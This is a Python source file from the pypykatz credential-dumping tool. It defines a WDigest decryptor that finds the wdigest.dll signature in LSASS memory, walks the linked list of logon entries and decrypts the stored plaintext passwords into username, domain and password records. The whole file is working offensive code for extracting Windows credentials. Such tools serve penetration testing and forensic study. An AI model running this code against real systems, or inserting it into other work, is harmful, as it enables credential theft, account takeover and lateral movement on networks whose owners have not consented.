#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import json

from pypykatz.alsadecryptor.package_commons import PackageDecryptor
from pypykatz.alsadecryptor.win_datatypes import LSA_UNICODE_STRING

class WdigestCredential:
	def __init__(self):
		self.credtype = 'wdigest'
		self.username = None
		self.domainname = None
		self.password = None
		self.password_raw = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['password_raw'] = self.password_raw
		t['luid'] = self.luid
		return t
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== WDIGEST [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		t += '\t\tpassword (hex)%s\n' % self.password_raw.hex()
		return t
		
class WdigestDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo):
		super().__init__('Wdigest', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credentials = []

	async def find_first_entry(self):
		position = await self.find_signature('wdigest.dll',self.decryptor_template.signature)
		ptr_entry_loc = await self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = await self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	async def add_entry(self, wdigest_entry):
		"""
		Changed the wdigest parsing, the struct only contains the pointers in the linked list, the actual data is read by 
		adding an offset to the current entry's position
		"""
		wc = WdigestCredential()
		wc.luid = wdigest_entry.luid
		
		#input(wdigest_entry.this_entry.value)
		await self.reader.move(wdigest_entry.this_entry.value + self.decryptor_template.primary_offset)
		UserName = await LSA_UNICODE_STRING.load(self.reader)
		DomainName = await LSA_UNICODE_STRING.load(self.reader)
		Password = await LSA_UNICODE_STRING.load(self.reader)

		wc.username = await UserName.read_string(self.reader)
		wc.domainname = await DomainName.read_string(self.reader)
		wc.encrypted_password = await Password.read_maxdata(self.reader)
		if wc.username.endswith('$') is True:
			wc.password, wc.password_raw = self.decrypt_password(wc.encrypted_password, bytes_expected=True)
			if wc.password is not None:
				wc.password = wc.password.hex()
		else:
			wc.password, wc.password_raw = self.decrypt_password(wc.encrypted_password)

		if wc.username == '' and wc.domainname == '' and wc.password is None:
			return
			
		self.credentials.append(wc)
	
	async def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = await self.find_first_entry()
		except Exception as e:
			self.log('Failed to find Wdigest structs! Reason: %s' % e)
			return
		await self.reader.move(entry_ptr_loc)
		entry_ptr = await self.decryptor_template.list_entry.load(self.reader)
		await self.walk_list(entry_ptr, self.add_entry)